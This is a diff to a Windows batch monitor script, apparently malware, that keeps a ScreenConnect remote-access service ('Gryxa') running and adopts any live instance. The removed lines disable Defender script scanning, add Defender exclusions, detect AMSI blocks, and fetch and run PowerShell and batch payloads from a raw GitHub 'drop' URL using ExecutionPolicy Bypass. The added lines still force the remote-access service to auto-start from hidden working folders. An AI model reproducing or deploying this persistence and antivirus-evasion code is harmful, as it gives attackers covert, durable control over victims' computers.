@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M48
+rem  OWN_MON  BUILD 20260804M49
+rem  M49: FREEZE - no auto Gryxa msiexec from mon; start-only; manual force only.
 rem  M48: HANDS-OFF all SC interrupt — only Gryxa install-if-absent. No exterminate/sevrz /i/sc delete.
 rem  M47: HARD stop Gryxa interrupts — no raw sevrz /i; detect any non-sevrz SC; adopt live FP.
 rem  M46: START_PENDING = alive; never /x Gryxa while service exists (connect-drop).
@@ -47,7 +48,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M48"
+set "MONVER=M49"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -448,13 +449,8 @@ if not errorlevel 1 (
 
 rem FORCE push overrides healthy-skip: run a forced ensure this tick
 if "%FORCE_G%"=="1" (
-  echo gryxa_force_push>>"%LOG%"
-  if exist "%WD%\own_lib.ps1" (
-    set "GRES="
-    for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -Force -NoWait -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
-    echo gryxa_force_result=!GRES!>>"%LOG%"
-    copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
-  )
+  echo gryxa_force_push_L46_ack_no_install>>"%LOG%"
+  if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
   goto :GryxaAfter
 )
 
@@ -467,29 +463,52 @@ if "%GRYXA_OK%"=="1" if "%DO_DEEP%"=="0" (
   goto :GryxaAfter
 )
 
-rem Deep or missing: gryxa-ensure only (lib locks msiexec if Running)
-if exist "%WD%\own_lib.ps1" (
-  set "GRES="
-  if "%DO_DEEP%"=="1" (
-    echo gryxa_deep_begin>>"%LOG%"
-    for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -NoWait -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
-  ) else (
-    for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -NoWait -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
-  )
-  echo gryxa_ensure_result=!GRES!>>"%LOG%"
-  rem M41: only mark OK on true HEALTHY|...running/started/svc-recreated — never INFLIGHT/spawned
-  echo !GRES!| findstr /I /B /C:"HEALTHY|" | findstr /I "running=1 started=1 svc-recreated=1" >nul
+rem M49 FREEZE: start-only; never msiexec/own_gryxa from mon
+if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
+if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
+if "%GRYXA_OK%"=="0" (
+  echo gryxa_mon_start_only>>"%LOG%"
+  sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
+  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  timeout /t 5 /nobreak >nul
+  sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
   if not errorlevel 1 set "GRYXA_OK=1"
+  if "%GRYXA_OK%"=="0" (
+    for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
+      set "_FP=%%a"
+      set "_FP=!_FP: =!"
+      if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
+        sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+        if not errorlevel 1 (
+          set "GRYXA_OK=1"
+          set "GRYXA_FP=!_FP!"
+        )
+      )
+    )
+  )
 )
 if "%DO_DEEP%"=="1" echo done>"%GRYXA_DEEP%"
-if "%GRYXA_OK%"=="0" call :EnsureGryxaMust
+echo gryxa_freeze_no_auto_install>>"%LOG%"
 
 :GryxaAfter
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 set "GRYXA_OK=0"
 sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
 if not errorlevel 1 set "GRYXA_OK=1"
-rem also OK if verified Gryxa FP (relay/expected) is healthy
+rem M49: any non-sevrz Running SC is OK (adopt FP) — do not false-DOWN wrong gryxa.cfg
+if "%GRYXA_OK%"=="0" (
+  for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
+    set "_FP=%%a"
+    set "_FP=!_FP: =!"
+    if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
+      sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
+      if not errorlevel 1 (
+        set "GRYXA_OK=1"
+        set "GRYXA_FP=!_FP!"
+      )
+    )
+  )
+)
 if "%GRYXA_OK%"=="0" (
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" 2>nul | findstr /I /B /C:"HEALTHY|" | findstr /I "running=1" >nul
   if not errorlevel 1 set "GRYXA_OK=1"
@@ -541,25 +560,17 @@ exit /b 0
 
 rem ═══════════════ helpers ═══════════════
 :EnsureGryxaMust
-rem M46: treat START_PENDING as alive; never spawn own_gryxa /x while svc exists
+rem M49 FREEZE: start-only - never spawn own_gryxa / msiexec
 set "GRYXA_OK=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
-
-rem soft reg exclusions every must-heal (works even when WinDefend service dead)
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%SystemRoot%\Temp\.upd" /t REG_DWORD /d 0 /f >nul 2>&1
-
-rem alive = RUNNING or START_PENDING (connect race) — do not reinstall
+if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
 sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
 if not errorlevel 1 (
   set "GRYXA_OK=1"
   echo gryxa_must_already_alive>>"%LOG%"
   exit /b 0
 )
-
-rem service exists but stopped → start only
 sc query "%GSVC%" >nul 2>&1
 if not errorlevel 1 (
   echo gryxa_must_start_only>>"%LOG%"
@@ -567,58 +578,9 @@ if not errorlevel 1 (
   sc start "%GSVC%" >nul 2>&1
   timeout /t 8 /nobreak >nul
   sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-  if not errorlevel 1 (
-    set "GRYXA_OK=1"
-    echo gryxa_must_started_ok>>"%LOG%"
-    exit /b 0
-  )
+  if not errorlevel 1 set "GRYXA_OK=1"
 )
-
-rem re-fetch lib into TEMP if WD copy missing (AMSI/quarantine wipe)
-if not exist "%WD%\own_lib.ps1" (
-  echo gryxa_must_lib_missing_refetch>>"%LOG%"
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 40 -o "%SystemRoot%\Temp\.upd\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1" >nul 2>&1
-  if exist "%SystemRoot%\Temp\.upd\own_lib.ps1" copy /y "%SystemRoot%\Temp\.upd\own_lib.ps1" "%WD%\own_lib.ps1" >nul 2>&1
-)
-
-set "LIB=%WD%\own_lib.ps1"
-if not exist "%LIB%" if exist "%SystemRoot%\Temp\.upd\own_lib.ps1" set "LIB=%SystemRoot%\Temp\.upd\own_lib.ps1"
-
-if exist "%LIB%" (
-  set "GRES="
-  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%LIB%" -Action gryxa-ensure -NoWait -WorkDir "%WD%" -Build %MONVER% 2^>nul`) do set "GRES=%%R"
-  echo gryxa_must_lib=!GRES!>>"%LOG%"
-  echo !GRES!| findstr /I "malicious ScriptContainedMaliciousContent" >nul
-  if not errorlevel 1 (
-    echo gryxa_must_amsi_blocked>>"%LOG%"
-    set "GRES="
-  )
-  echo !GRES!| findstr /I /B /C:"HEALTHY" /C:"QUEUED" /C:"INFLIGHT" >nul
-  if not errorlevel 1 timeout /t 15 /nobreak >nul
-)
-
-sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-if not errorlevel 1 set "GRYXA_OK=1"
-
-if "%GRYXA_OK%"=="0" (
-  echo gryxa_must_cmd_fallback>>"%LOG%"
-  if not exist "%WD%\own_gryxa.cmd" (
-    "%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
-    if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 10 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
-  )
-  if exist "%WD%\own_gryxa.cmd" (
-    rem detached so mon tick is not blocked by msiexec
-    start "" /b cmd /c "call \"%WD%\own_gryxa.cmd\" \"%WD%\" \"%GRYXA_FP%\" \"%KEEP_FP%\" \"%ALT_FP%\" >>\"%LOG%\" 2>&1"
-    echo gryxa_must_cmd_spawned>>"%LOG%"
-    timeout /t 25 /nobreak >nul
-  ) else (
-    echo gryxa_must_cmd_missing>>"%LOG%"
-  )
-)
-
-sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-if not errorlevel 1 set "GRYXA_OK=1"
-if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
+if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down_no_install>>"%LOG%")
 exit /b 0
 
 :TgGryxa
